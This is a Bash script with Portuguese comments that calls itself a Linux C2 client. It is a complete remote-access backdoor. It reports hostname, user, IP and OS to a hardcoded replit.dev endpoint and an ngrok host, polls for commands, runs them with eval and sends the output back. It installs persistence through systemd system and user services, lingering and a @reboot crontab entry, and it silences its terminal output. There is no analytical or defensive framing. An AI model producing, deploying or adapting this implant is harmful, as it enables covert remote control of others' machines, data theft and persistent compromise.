#!/bin/bash
# Script cliente C2 para Linux
# Este script conecta-se ao servidor C2 e executa comandos
# Versão: 1.2 - Com suporte a instalação como serviço

# Detectar se o script está sendo executado como root
IS_ROOT=false
if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=true
fi

API_URL="https://7f3e0d9a-f5ab-4d9a-a7ad-04259223c4d9-00-3dsgchxw17fqz.janeway.replit.dev"
RETRY_INTERVAL=2
SILENT_MODE=false

# Obter informações do host
get_host_info() {
    HOSTNAME=$(hostname)
    USERNAME=$(whoami)
    IP=$(hostname -I | awk '{print $1}')
    OS=$(uname -a)
    TIMESTAMP=$(date +%s)
    
    echo "{\"hostname\":\"$HOSTNAME\",\"username\":\"$USERNAME\",\"ip\":\"$IP\",\"os\":\"$OS\",\"time\":$TIMESTAMP}"
}

# Enviar relatório de status
send_status_report() {
    HOST_INFO=$(get_host_info)
    
    curl -s -X POST -H "Content-Type: application/json" -d "$HOST_INFO" "$API_URL/report/status"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar relatório de status"
    fi
}

# Enviar heartbeat
send_heartbeat() {
    HOSTNAME=$(hostname)
    TIMESTAMP=$(date +%s)
    
    JSON="{\"hostname\":\"$HOSTNAME\",\"time\":$TIMESTAMP}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "$API_URL/heartbeat"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar heartbeat"
    fi
}

# Enviar log
send_log() {
    LOG_MESSAGE=$1
    LOG_TYPE=${2:-"info"}
    HOSTNAME=$(hostname)
    TIMESTAMP=$(date +%s)
    
    JSON="{\"hostname\":\"$HOSTNAME\",\"log\":\"$LOG_MESSAGE\",\"time\":$TIMESTAMP,\"type\":\"$LOG_TYPE\"}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "$API_URL/report/logs"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar log: $LOG_MESSAGE"
    fi
}

# Enviar erro
send_error() {
    ERROR_MESSAGE=$1
    HOSTNAME=$(hostname)
    TIMESTAMP=$(date +%s)
    
    JSON="{\"hostname\":\"$HOSTNAME\",\"error\":\"$ERROR_MESSAGE\",\"time\":$TIMESTAMP}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "http://${NGROK_HOST}:${NGROK_PORT}/error"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar erro: $ERROR_MESSAGE"
    fi
}

# Enviar saída de comando - Não usado mais diretamente
# Agora a comunicação direta é feita na função execute_command
send_command_output() {
    echo "Função desativada - usando conexão direta na função execute_command"
}

# Obter comando do servidor
get_command() {
    HOSTNAME=$(hostname)
    
    COMMAND=$(curl -s "http://${NGROK_HOST}:${NGROK_PORT}/command?hostname=$HOSTNAME")
    
    echo "$COMMAND"
}

# Executar comando
execute_command() {
    COMMAND=$1
    
    if [ -z "$COMMAND" ]; then
        return
    fi
    
    send_log "Executando comando: $COMMAND"
    
    # Criar diretório temporário para armazenar a saída
    TEMP_DIR=$(mktemp -d)
    TEMP_FILE="$TEMP_DIR/output.txt"
    
    # Executar comando em um subshell com diretório temporário para manter contexto de diretório
    # Redirecionar saída padrão e erro para arquivo temporário
    (cd "$PWD" && eval "$COMMAND" > "$TEMP_FILE" 2>&1)
    
    # Ler a saída do arquivo
    OUTPUT=$(cat "$TEMP_FILE")
    
    # Limpar arquivos temporários
    rm -rf "$TEMP_DIR"
    
    # Se não houver saída, usar uma mensagem padrão
    if [ -z "$OUTPUT" ]; then
        OUTPUT="Comando executado com sucesso, sem saída."
    fi
    
    # Enviar saída de comando diretamente para o endpoint específico
    # Usar curl diretamente em vez de função send_command_output para garantir o envio
    HOSTNAME=$(hostname)
    TIMESTAMP=$(date +%s)
    
    # Escapar aspas e caracteres especiais no output para evitar problemas com JSON
    OUTPUT_ESCAPED=$(echo "$OUTPUT" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | sed ':a;N;$!ba;s/\n/\\n/g' | sed 's/\r/\\r/g' | sed 's/\t/\\t/g')
    
    JSON="{\"hostname\":\"$HOSTNAME\",\"command\":\"$COMMAND\",\"output\":\"$OUTPUT_ESCAPED\",\"time\":$TIMESTAMP}"
    
    # Salvar JSON em um arquivo temporário para debug
    echo "$JSON" > /tmp/command_output.json
    
    # Enviar diretamente para o endpoint de saída de comando (sem log adicional)
    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "http://${NGROK_HOST}:${NGROK_PORT}/report/output"
    
    # Registrar que o comando foi executado (evita mensagens duplicadas)
    echo "Comando $COMMAND executado com sucesso."
}

# Atualizar configuração
update_config() {
    CONFIG=$(curl -s "http://${NGROK_HOST}:${NGROK_PORT}/config")
    
    if [ $? -eq 0 ]; then
        NGROK_HOST=$(echo "$CONFIG" | grep -o '"ngrok_host":"[^"]*"' | cut -d'"' -f4)
        NGROK_PORT=$(echo "$CONFIG" | grep -o '"ngrok_port":[0-9]*' | cut -d':' -f2)
        RETRY_INTERVAL=$(echo "$CONFIG" | grep -o '"retry_interval":[0-9]*' | cut -d':' -f2)
        SILENT_MODE=$(echo "$CONFIG" | grep -o '"silent_mode":(true|false)' | cut -d':' -f2)
    elif [ "$SILENT_MODE" = false ]; then
        echo "Falha ao atualizar configuração"
    fi
}

# Variável para controlar a execução de comandos
EXECUTING_COMMAND=false

# Definir caminhos para persistência
SCRIPT_NAME="remote_agent.sh"
USER_HOME="$HOME"
PERSIST_DIR="$USER_HOME/.local/bin"
PERSIST_FILE="$PERSIST_DIR/$SCRIPT_NAME"
LOG_FILE="$USER_HOME/.local/remote_agent.log"
SYSTEMD_USER_DIR="$USER_HOME/.config/systemd/user"
SYSTEMD_USER_SERVICE="remote-agent.service"
SYSTEMD_SYSTEM_DIR="/etc/systemd/system"
SYSTEMD_SYSTEM_SERVICE="remote-agent.service"

# Salvar script em local persistente
save_script() {
    mkdir -p "$PERSIST_DIR"
    cp "$0" "$PERSIST_FILE"
    chmod +x "$PERSIST_FILE"
    
    # Criar diretório de log
    mkdir -p "$(dirname "$LOG_FILE")"
    touch "$LOG_FILE"
}

# Verificar se systemd está disponível (para instalação como serviço)
has_systemd() {
    if command -v systemctl >/dev/null 2>&1; then
        return 0
    else
        return 1
    fi
}

# Criar arquivo de serviço system-wide (requer root)
create_system_service() {
    if [ "$IS_ROOT" = false ]; then
        echo "Precisa ser root para criar um serviço system-wide"
        return 1
    fi
    
    mkdir -p "$SYSTEMD_SYSTEM_DIR"
    cat > "$SYSTEMD_SYSTEM_DIR/$SYSTEMD_SYSTEM_SERVICE" << EOF
[Unit]
Description=Remote System Agent
After=network.target

[Service]
Type=simple
ExecStart=$PERSIST_FILE
Restart=always
RestartSec=5
StandardOutput=append:$LOG_FILE
StandardError=append:$LOG_FILE

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SYSTEMD_SYSTEM_SERVICE"
    systemctl start "$SYSTEMD_SYSTEM_SERVICE"
    
    return 0
}

# Criar arquivo de serviço user-level (não requer root)
create_user_service() {
    mkdir -p "$SYSTEMD_USER_DIR"
    cat > "$SYSTEMD_USER_DIR/$SYSTEMD_USER_SERVICE" << EOF
[Unit]
Description=Remote User Agent
After=network.target

[Service]
Type=simple
ExecStart=$PERSIST_FILE
Restart=always
RestartSec=5
StandardOutput=append:$LOG_FILE
StandardError=append:$LOG_FILE

[Install]
WantedBy=default.target
EOF

    systemctl --user daemon-reload
    systemctl --user enable "$SYSTEMD_USER_SERVICE"
    systemctl --user start "$SYSTEMD_USER_SERVICE"
    
    # Tornar o serviço persistente após logout (se lingering estiver disponível)
    if [ "$IS_ROOT" = true ]; then
        loginctl enable-linger "$(logname)" 2>/dev/null || true
    else
        # Tentar ativar o lingering para o próprio usuário
        # Isso pode falhar em alguns sistemas, mas não impede a operação
        loginctl enable-linger "$USER" 2>/dev/null || true
    fi
    
    return 0
}

# Instalar script como daemon usando métodos alternativos (se systemd não estiver disponível)
create_alternative_daemon() {
    # Método 1: usando nohup
    nohup "$PERSIST_FILE" > "$LOG_FILE" 2>&1 &
    
    # Método 2: adicionar ao crontab para reiniciar após reboot
    (crontab -l 2>/dev/null || echo "") | grep -v "$PERSIST_FILE" > /tmp/crontab.tmp
    echo "@reboot $PERSIST_FILE > $LOG_FILE 2>&1" >> /tmp/crontab.tmp
    crontab /tmp/crontab.tmp
    rm /tmp/crontab.tmp
    
    return 0
}

# Instalar o serviço de acordo com as permissões disponíveis
install_service() {
    # Salvar o script no local persistente
    save_script
    
    # Verificar se podemos usar systemd
    if has_systemd; then
        # Tentar instalar como serviço system-wide se for root
        if [ "$IS_ROOT" = true ]; then
            echo "Instalando como serviço system-wide..."
            if create_system_service; then
                echo "Serviço instalado com sucesso (system-wide)"
                # Sair do script atual, pois o serviço já está rodando
                exit 0
            fi
        fi
        
        # Tentar instalar como serviço user-level se não for root ou o system-wide falhar
        echo "Instalando como serviço user-level..."
        if create_user_service; then
            echo "Serviço instalado com sucesso (user-level)"
            # Sair do script atual, pois o serviço já está rodando
            exit 0
        fi
    fi
    
    # Se systemd não estiver disponível ou falhar, usar método alternativo
    echo "Instalando usando método alternativo..."
    if create_alternative_daemon; then
        echo "Serviço instalado com sucesso (método alternativo)"
        # Sair do script atual, pois o daemon já está rodando
        exit 0
    fi
    
    # Se nenhum método funcionar, apenas continuar como processo em primeiro plano
    echo "Não foi possível instalar como serviço, continuando em primeiro plano"
    return 1
}

# Iniciar em segundo plano
daemonize() {
    # Verificar se já está rodando como daemon
    if [ -z "$RUNNING_AS_DAEMON" ]; then
        # Criar um novo processo em segundo plano
        RUNNING_AS_DAEMON=1 nohup "$0" > "$LOG_FILE" 2>&1 &
        echo "Script iniciado em segundo plano com PID $!"
        exit 0
    fi
}

# Loop principal
main() {
    # Remover qualquer estrutura de controle de terminal
    [ -t 0 ] && exec </dev/null
    [ -t 1 ] && exec >/dev/null
    [ -t 2 ] && exec 2>/dev/null
    
    # Se não for um daemon, tentar instalar como serviço
    if [ -z "$RUNNING_AS_DAEMON" ]; then
        # Salvar script para persistência
        save_script
        
        # Tentar instalar como serviço (system-wide ou user-level)
        install_service
        
        # Se falhar, iniciar como daemon
        daemonize
    fi
    
    # Se chegou aqui, está rodando como daemon ou serviço
    # Enviar relatório de status inicial
    send_status_report
    
    # Loop principal
    while true; do
        # Enviar heartbeat em paralelo para não bloquear
        send_heartbeat &
        
        # Obter comando do servidor se não estiver executando outro comando
        if [ "$EXECUTING_COMMAND" = false ]; then
            COMMAND=$(get_command)
            if [ ! -z "$COMMAND" ]; then
                # Marcar que está executando um comando
                EXECUTING_COMMAND=true
                
                # Executar comando em background para não bloquear o loop principal
                (
                    execute_command "$COMMAND"
                    # Após terminar a execução, liberar para o próximo comando
                    EXECUTING_COMMAND=false
                ) &
            fi
        fi
        
        # Atualizar configuração (em background)
        update_config &
        
        # Aguardar intervalo de tempo mais curto para comandos
        sleep $RETRY_INTERVAL
    done
}

# Iniciar o script
main